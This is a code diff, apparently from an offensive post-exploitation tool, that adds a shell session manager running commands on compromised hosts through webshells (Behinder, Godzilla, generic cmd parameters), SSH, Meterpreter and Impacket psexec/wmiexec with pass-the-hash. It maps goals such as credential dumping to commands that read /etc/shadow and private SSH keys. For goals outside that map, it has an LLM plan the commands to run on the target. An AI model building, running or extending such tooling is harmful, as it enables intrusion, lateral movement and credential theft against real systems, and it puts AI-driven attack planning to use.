@@ -396,6 +396,303 @@ class ShellSessionManager:
         except Exception:
             return False
 
+    # ==================== 统一命令执行接口 ====================
+
+    def execute_command(self, session_id: str, command: str,
+                        timeout: float = 30) -> Dict:
+        """
+        统一的命令执行接口
+
+        根据会话类型自动选择执行方法
+
+        Args:
+            session_id: 会话ID
+            command: 要执行的命令
+            timeout: 超时时间（秒）
+
+        Returns:
+            {"success": bool, "output": str, "error": str}
+        """
+        session = self.sessions.get(session_id)
+        if not session:
+            return {"success": False, "output": "", "error": "会话不存在"}
+
+        try:
+            if session.session_type == ShellType.WEBSHELL:
+                result = self._execute_webshell(session, command, timeout)
+
+            elif session.session_type == ShellType.SSH:
+                result = self._execute_ssh(session, command, timeout)
+
+            elif session.session_type == ShellType.METERPRETER:
+                result = self._execute_meterpreter(session, command)
+
+            elif session.session_type == ShellType.IMPACKET:
+                result = self._execute_impacket(session, command, timeout)
+
+            else:
+                return {"success": False, "output": "", "error": f"不支持的会话类型: {session.session_type}"}
+
+            # 更新活跃时间
+            session.last_active = time.time()
+
+            return result
+
+        except Exception as e:
+            return {"success": False, "output": "", "error": str(e)}
+
+    def _execute_webshell(self, session: ShellSession, command: str,
+                          timeout: float) -> Dict:
+        """通过WebShell执行命令"""
+        # 根据webshell类型执行
+        shell_type = session.metadata.get("shell_type", "custom")
+
+        if shell_type == "behinder":
+            return self._execute_behinder(session, command, timeout)
+        elif shell_type == "godzilla":
+            return self._execute_godzilla(session, command, timeout)
+        else:
+            return self._execute_generic_webshell(session, command, timeout)
+
+    def _execute_behinder(self, session: ShellSession, command: str,
+                          timeout: float) -> Dict:
+        """执行冰蝎WebShell"""
+        # 冰蝎使用加密通信
+        try:
+            import requests
+            # 构造请求（需要根据冰蝎协议）
+            payload = {"command": command}
+            resp = requests.post(session.url, json=payload, timeout=timeout)
+            return {"success": True, "output": resp.text, "error": ""}
+        except Exception as e:
+            return {"success": False, "output": "", "error": str(e)}
+
+    def _execute_godzilla(self, session: ShellSession, command: str,
+                          timeout: float) -> Dict:
+        """执行哥斯拉WebShell"""
+        try:
+            import requests
+            # 构造请求（需要根据哥斯拉协议）
+            payload = {"pass": command}
+            resp = requests.post(session.url, data=payload, timeout=timeout)
+            return {"success": True, "output": resp.text, "error": ""}
+        except Exception as e:
+            return {"success": False, "output": "", "error": str(e)}
+
+    def _execute_generic_webshell(self, session: ShellSession, command: str,
+                                   timeout: float) -> Dict:
+        """执行普通WebShell"""
+        try:
+            import requests
+            # 简单的GET/POST方式
+            resp = requests.get(
+                f"{session.url}?cmd={command}",
+                timeout=timeout
+            )
+            return {"success": True, "output": resp.text, "error": ""}
+        except Exception as e:
+            return {"success": False, "output": "", "error": str(e)}
+
+    def _execute_ssh(self, session: ShellSession, command: str,
+                     timeout: float) -> Dict:
+        """通过SSH执行命令"""
+        result = self._execute_ssh_command(
+            session.host,
+            session.username,
+            session.password,
+            session.private_key,
+            session.port,
+            command
+        )
+        if result:
+            return {"success": True, "output": result, "error": ""}
+        return {"success": False, "output": "", "error": "SSH执行失败"}
+
+    def _execute_meterpreter(self, session: ShellSession, command: str) -> Dict:
+        """通过Meterpreter执行命令"""
+        try:
+            from tools.metasploit_manager import get_msf_manager
+            msf = get_msf_manager()
+
+            # 尝试连接
+            if not msf.token:
+                msf.connect()
+
+            if not msf.token:
+                return {"success": False, "output": "", "error": "无法连接MSF"}
+
+            # 执行命令
+            result = msf.execute(int(session.id), command)
+            return result
+
+        except ImportError:
+            return {"success": False, "output": "", "error": "MSF模块未安装"}
+        except Exception as e:
+            return {"success": False, "output": "", "error": str(e)}
+
+    def _execute_impacket(self, session: ShellSession, command: str,
+                          timeout: float) -> Dict:
+        """通过Impacket执行命令"""
+        try:
+            # 使用impacket工具执行命令
+            method = session.metadata.get("method", "psexec")
+            hash_ = session.metadata.get("hash", "")
+            domain = session.metadata.get("domain", "")
+
+            # 构建命令
+            import shutil
+            script_map = {
+                "psexec": "psexec.py",
+                "wmiexec": "wmiexec.py",
+                "smbexec": "smbexec.py",
+                "atexec": "atexec.py"
+            }
+
+            script = script_map.get(method, "psexec.py")
+            script_path = shutil.which(script)
+
+            if not script_path:
+                return {"success": False, "output": "", "error": f"找不到 {script}"}
+
+            # 构建认证
+            if domain:
+                auth = f"{domain}/{session.username}"
+            else:
+                auth = session.username
+
+            if hash_:
+                cmd = [script_path, "-hashes", hash_, f"{auth}@{session.host}", command]
+            else:
+                cmd = [script_path, f"{auth}:{session.password}@{session.host}", command]
+
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+
+            return {
+                "success": result.returncode == 0,
+                "output": result.stdout,
+                "error": result.stderr if result.returncode != 0 else ""
+            }
+
+        except subprocess.TimeoutExpired:
+            return {"success": False, "output": "", "error": "执行超时"}
+        except Exception as e:
+            return {"success": False, "output": "", "error": str(e)}
+
+    # ==================== 智能交互 ====================
+
+    def smart_execute(self, session_id: str, goal: str) -> Dict:
+        """
+        智能执行 - 根据目标自动决定操作
+
+        Args:
+            session_id: 会话ID
+            goal: 目标描述
+                - "获取系统信息"
+                - "提权"
+                - "导出凭据"
+                - "发现内网"
+
+        Returns:
+            {
+                "success": bool,
+                "result": "结果描述",
+                "output": "详细输出",
+                "next_steps": ["建议的下一步"]
+            }
+        """
+        session = self.sessions.get(session_id)
+        if not session:
+            return {"success": False, "result": "会话不存在", "output": "", "next_steps": []}
+
+        # 预定义的命令映射
+        command_map = {
+            "获取系统信息": {
+                "linux": "whoami && id && hostname && uname -a",
+                "windows": "whoami && hostname && systeminfo"
+            },
+            "提权检查": {
+                "linux": "sudo -l 2>/dev/null; find / -perm -4000 2>/dev/null",
+                "windows": "whoami /priv"
+            },
+            "发现内网": {
+                "linux": "ip a; ip route; arp -a 2>/dev/null",
+                "windows": "ipconfig /all && arp -a"
+            },
+            "导出凭据": {
+                "linux": "cat /etc/shadow 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null",
+                "windows": "type %USERPROFILE%\\Desktop\\* 2>nul"
+            }
+        }
+
+        # 获取目标命令
+        if goal in command_map:
+            command = command_map[goal].get(
+                session.os_type,
+                command_map[goal].get("linux", "")
+            )
+        else:
+            # AI决策
+            command = self._ai_plan_command(session, goal)
+
+        if not command:
+            return {"success": False, "result": "无法确定命令", "output": "", "next_steps": []}
+
+        # 执行命令
+        result = self.execute_command(session_id, command)
+
+        return {
+            "success": result.get("success", False),
+            "result": goal if result.get("success") else f"{goal} 失败",
+            "output": result.get("output", ""),
+            "error": result.get("error", ""),
+            "next_steps": []
+        }
+
+    def _ai_plan_command(self, session: ShellSession, goal: str) -> str:
+        """AI规划命令"""
+        try:
+            from llm_client import llm_client
+            from config import config
+            import json
+
+            prompt = f"""根据目标和环境，决定要执行的命令。
+
+## 目标
+{goal}
+
+## 环境
+- 操作系统: {session.os_type}
+- 目标: {session.target}
+- 会话类型: {session.session_type.value}
+- 权限: {'管理员' if session.is_admin else '普通用户'}
+
+## 输出格式 (JSON)
+{{
+  "command": "要执行的命令",
+  "description": "命令说明"
+}}
+"""
+            response = llm_client.call_chat_completion(
+                model=config.ANALYST_MODEL,
+                messages=[{"role": "user", "content": prompt}],
+                temperature=0.1,
+                json_mode=True
+            )
+
+            if "```json" in response:
+                response = response.split("```json")[1].split("```")[0]
+
+            data = json.loads(response.strip())
+            return data.get("command", "")
+
+        except Exception:
+            return ""
+
 
 # 全局会话管理器实例
 _session_manager = None
